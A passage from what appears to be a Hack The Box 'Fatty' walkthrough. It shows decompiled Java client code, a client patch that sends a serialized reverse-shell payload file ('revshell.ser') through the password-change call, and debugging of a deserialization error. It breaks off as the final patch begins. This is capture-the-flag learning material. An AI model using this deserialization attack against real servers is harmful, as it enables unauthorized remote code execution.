</span></span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see <code>changePW</code> on the client: <code>htb/fatty/client/methods/Invoker.java</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>changePW</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>newPassword</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>MessageParseException</span><span class=p>,</span><span class=w> </span><span class=n>MessageBuildException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>String</span><span class=w> </span><span class=n>methodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>  </span><span class=p>}).</span><span class=na>getClass</span><span class=p>().</span><span class=na>getEnclosingMethod</span><span class=p>().</span><span class=na>getName</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>logger</span><span class=p>.</span><span class=na>logInfo</span><span class=p>(</span><span class=s>&#34;[+] Method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>methodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; was called by user &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>user</span><span class=p>.</span><span class=na>getUsername</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>AccessCheck</span><span class=p>.</span><span class=na>checkAccess</span><span class=p>(</span><span class=n>methodName</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>user</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Error: Method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>methodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; is not allowed for this user account&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>User</span><span class=w> </span><span class=n>user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>User</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>newPassword</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>bOut</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oOut</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>bOut</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>oOut</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>user</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Failure while serializing user object&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serializedUser64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encode</span><span class=p>(</span><span class=n>bOut</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>action</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ActionMessage</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>sessionID</span><span class=p>,</span><span class=w> </span><span class=s>&#34;changePW&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>action</span><span class=p>.</span><span class=na>addArgument</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>serializedUser64</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>sendAndRecv</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>hasError</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Error: Your action caused an error on the application server!&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>response</span><span class=p>.</span><span class=na>getContentAsString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>So what we have to do is patch <code>pwChangeButton.addActionListener</code> and
replace</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>passwordChange</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Not implemented yet.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>by</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;revshell.ser&#34;</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>invoker</span><span class=p>.</span><span class=na>changePW</span><span class=p>(</span><span class=s>&#34;qtc&#34;</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e42</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>passwordChange</span><span class=p>,</span><span class=w> </span><span class=s>&#34;WTF happened&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>e42</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Also <code>changePW</code> will call the User class overloaded constructor with 2 args
<code>public User(String username, String password)</code> that will call the full User
constructor <code>User(int uid, String username, String password, String email, Role role)</code>.</p><p>But in the full constructor the password is hashed so we need to change it from:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/*     */</span><span class=w>   </span><span class=kd>public</span><span class=w> </span><span class=nf>User</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>uid</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>email</span><span class=p>,</span><span class=w> </span><span class=n>Role</span><span class=w> </span><span class=n>role</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  20 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>uid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uid</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  21 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>username</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  23 */</span><span class=w>     </span><span class=n>String</span><span class=w> </span><span class=n>hashString</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;clarabibimakeseverythingsecure&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  24 */</span><span class=w>     </span><span class=n>MessageDigest</span><span class=w> </span><span class=n>digest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>     </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  26 */</span><span class=w>       </span><span class=n>digest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>MessageDigest</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=s>&#34;SHA-256&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  27 */</span><span class=w>     </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchAlgorithmException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  28 */</span><span class=w>       </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>     </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  30 */</span><span class=w>     </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>hash</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>digest</span><span class=p>.</span><span class=na>digest</span><span class=p>(</span><span class=n>hashString</span><span class=p>.</span><span class=na>getBytes</span><span class=p>(</span><span class=n>StandardCharsets</span><span class=p>.</span><span class=na>UTF_8</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  32 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DatatypeConverter</span><span class=p>.</span><span class=na>printHexBinary</span><span class=p>(</span><span class=n>hash</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  33 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>email</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  34 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>role</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>role</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>to</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=nf>User</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>uid</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>email</span><span class=p>,</span><span class=w> </span><span class=n>Role</span><span class=w> </span><span class=n>role</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>uid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uid</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>username</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>password</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>email</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>this</span><span class=p>.</span><span class=na>role</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>role</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>But I always end with this error:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>java.io.NotSerializableException: htb.fatty.shared.resources.Role
</span></span><span class=line><span class=cl>        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)
</span></span><span class=line><span class=cl>        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
</span></span><span class=line><span class=cl>        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)
</span></span><span class=line><span class=cl>        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
</span></span><span class=line><span class=cl>        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
</span></span><span class=line><span class=cl>        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)
</span></span><span class=line><span class=cl>        at htb.fatty.client.methods.Invoker.changePW(Invoker.java:133)
</span></span><span class=line><span class=cl>        at htb.fatty.client.gui.ClientGuiTest$16.actionPerformed(ClientGuiTest.java:442)
</span></span><span class=line><span class=cl>        at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2022)
</span></span><span class=line><span class=cl>        at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2348)
</span></span><span class=line><span class=cl>        at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
</span></span><span class=line><span class=cl>        at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
</span></span><span class=line><span class=cl>        at javax.swing.AbstractButton.doClick(AbstractButton.java:376)
</span></span><span class=line><span class=cl>        at javax.swing.plaf.basic.BasicMenuItemUI.doClick(BasicMenuItemUI.java:842)
</span></span><span class=line><span class=cl>        at javax.swing.plaf.basic.BasicMenuItemUI$Handler.mouseReleased(BasicMenuItemUI.java:886)
</span></span><span class=line><span class=cl>        at java.awt.Component.processMouseEvent(Component.java:6539)
</span></span><span class=line><span class=cl>        at javax.swing.JComponent.processMouseEvent(JComponent.java:3324)
</span></span><span class=line><span class=cl>        at java.awt.Component.processEvent(Component.java:6304)
</span></span><span class=line><span class=cl>        at java.awt.Container.processEvent(Container.java:2239)
</span></span><span class=line><span class=cl>        at java.awt.Component.dispatchEventImpl(Component.java:4889)
</span></span><span class=line><span class=cl>        at java.awt.Container.dispatchEventImpl(Container.java:2297)
</span></span><span class=line><span class=cl>        at java.awt.Component.dispatchEvent(Component.java:4711)
</span></span><span class=line><span class=cl>        at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4904)
</span></span><span class=line><span class=cl>        at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4535)
</span></span><span class=line><span class=cl>        at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4476)
</span></span><span class=line><span class=cl>        at java.awt.Container.dispatchEventImpl(Container.java:2283)
</span></span><span class=line><span class=cl>        at java.awt.Window.dispatchEventImpl(Window.java:2746)
</span></span><span class=line><span class=cl>        at java.awt.Component.dispatchEvent(Component.java:4711)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:760)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue.access$500(EventQueue.java:97)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue$3.run(EventQueue.java:709)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue$3.run(EventQueue.java:703)
</span></span><span class=line><span class=cl>        at java.security.AccessController.doPrivileged(Native Method)
</span></span><span class=line><span class=cl>        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)
</span></span><span class=line><span class=cl>        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:84)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue$4.run(EventQueue.java:733)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue$4.run(EventQueue.java:731)
</span></span><span class=line><span class=cl>        at java.security.AccessController.doPrivileged(Native Method)
</span></span><span class=line><span class=cl>        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)
</span></span><span class=line><span class=cl>        at java.awt.EventQueue.dispatchEvent(EventQueue.java:730)
</span></span><span class=line><span class=cl>        at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:205)
</span></span><span class=line><span class=cl>        at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:116)
</span></span><span class=line><span class=cl>        at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:105)
</span></span><span class=line><span class=cl>        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:101)
</span></span><span class=line><span class=cl>        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:93)
</span></span><span class=line><span class=cl>        at java.awt.EventDispatchThread.run(EventDispatchThread.java:82)
</span></span></code></pre></td></tr></table></div></div><p>The error is hit in this chunk of code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oOut</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>bOut</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>oOut</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>user</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Failure while serializing user object&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>The user class is serializable:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>User</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kd>implements</span><span class=w> </span><span class=n>Serializable</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>but not the role class</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Role</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>As said in <a href=https://stackoverflow.com/questions/13895867/why-does-writeobject-throw-java-io-notserializableexception-and-how-do-i-fix-it>this stackOverflow post</a>
we either need to:</p><ul><li>make the Role class <code>Serializable</code></li><li>mark the Role field as <code>transient</code> is it&rsquo;s unneeded in the serialized form</li></ul><p>So I added <code>implements Serializable</code> on the Role class, now I don&rsquo;t have error
on client side but instead <code>Error: Failure while recovering the User object.</code>
because it&rsquo;s a shared library so the client can now serialize it but the
server can&rsquo;t deserialize it as the shared library on server side remains untouched.</p><p>So I guess we will have to not serialize it. So I marked the field as</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>implements</span><span class=w> </span><span class=n>Serializable</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>uid</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>email</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>transient</span><span class=w> </span><span class=n>Role</span><span class=w> </span><span class=n>role</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>but I ended up with the same deserialization error.</p><p>Because the server expect a user object, I thought that anything else would be
refused.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>User</span><span class=w> </span><span class=n>user1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>User</span><span class=p>)</span><span class=n>oIn</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>But in fact we should send our raw serialized payload without trying to package it
as the password of the user object.</p><p>So here is the final client GUI modification:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
